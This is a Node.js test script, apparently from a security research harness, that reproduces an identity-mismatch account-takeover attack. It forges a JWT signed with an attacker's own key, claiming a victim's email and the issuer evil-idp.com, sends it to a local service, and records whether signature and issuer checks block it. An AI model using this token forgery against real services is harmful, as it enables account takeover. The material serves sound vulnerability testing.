const axios = require('axios');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const path = require('path');
const MetricsCollector = require('./utils/metrics-collector');

const collector = new MetricsCollector(
  'T7',
  'Identity-Account Mismatch',
  'Liu et al. (WWW 2021) - Inconsistent Identity linking across IdP/SP'
);

const SECURE_MODE = process.env.SECURE_MODE === 'true';

// Load ATTACKER's own RSA private key (different from system's legitimate key)
const ATTACKER_PRIVATE_KEY = fs.readFileSync(path.join(__dirname, 'attacker_private.pem'), 'utf8');

async function runTest() {
  console.log(`[T7] Starting Identity Mismatch tests. Secure Mode: ${SECURE_MODE}`);
  
  // =====================================================================
  // ATTACK SCENARIO:
  // The attacker runs their own fake IdP ("evil-idp.com").
  // They sign a JWT with THEIR OWN private key (not our system's key).
  // The JWT claims to be victim@test.com.
  // 
  // In INSECURE mode: Service A only jwt.decode()s (no signature check),
  //   so it trusts the email claim → Account Takeover.
  // In SECURE mode: Service A jwt.verify()s with OUR public key,
  //   so the attacker's signature is INVALID → 401 Rejected.
  // =====================================================================
  
  console.log(`[T7] Signing malicious token with ATTACKER's own private key...`);
  
  const evilToken = jwt.sign(
    {
      iss: 'http://evil-idp.com',    // WRONG ISSUER
      sub: 'attacker_001',           // WRONG SUBJECT
      aud: 'service-a',
      email: 'victim@test.com',      // VICTIM'S EMAIL (identity theft)
      role: 'user',
      jti: 'evil-jti-' + Date.now(),
      exp: Math.floor(Date.now() / 1000) + 3600
    },
    ATTACKER_PRIVATE_KEY,            // ATTACKER'S KEY (not ours!)
    { algorithm: 'RS256' }
  );
  
  console.log(`[T7] Evil token created: ${evilToken.substring(0, 30)}...`);
  console.log(`[T7] Token claims iss=evil-idp.com, sub=attacker_001, email=victim@test.com`);
  console.log(`[T7] Token signed with ATTACKER's private key (different from system's)`);
  
  let success = false;
  try {
    console.log(`[T7] Sending evil token to Service A /dashboard...`);
    const dashboardRes = await axios.get('http://localhost:4002/dashboard', {
      headers: { Authorization: `Bearer ${evilToken}` }
    });
    if (dashboardRes.status === 200) {
      console.log(`[T7] 🚨 VULNERABILITY: Service A accepted token with wrong issuer AND wrong signature!`);
      console.log(`[T7]    → Account Takeover: attacker accessed victim's dashboard.`);
      success = true;
    }
  } catch (err) {
    if (err.response && err.response.status === 401) {
      const reason = err.response.data.error || 'unknown';
      console.log(`[T7] 🔒 BLOCKED: Service A rejected token. Reason: ${reason}`);
      if (reason === 'token_verification_failed') {
        console.log(`[T7]    → Signature verification caught the attacker's foreign key.`);
      } else if (reason === 'invalid_issuer') {
        console.log(`[T7]    → Issuer validation caught evil-idp.com.`);
      }
    } else {
      console.log(`[T7] Request failed: ${err.message}`);
    }
  }
  
  collector.addResult({
    variant: 'Fake IdP with Foreign Key Pair',
    attackerUsedOwnKey: true,
    attackerIssuer: 'http://evil-idp.com',
    attackerSub: 'attacker_001',
    victimEmail: 'victim@test.com',
    attackSuccessful: success,
    mitigatedBySecureMode: SECURE_MODE && !success
  });
  
  collector.setComparison(
    'Liu et al. note that email-only linking without issuer/signature verification causes account takeover.',
    `Account Takeover was: ${success ? 'Successful (foreign key accepted!)' : 'Blocked (signature/issuer rejected)'}.`,
    SECURE_MODE ? 'CONFIRMED MITIGATION' : 'CONFIRMED VULNERABILITY'
  );
  
  collector.save();
}

runTest().catch(console.error);
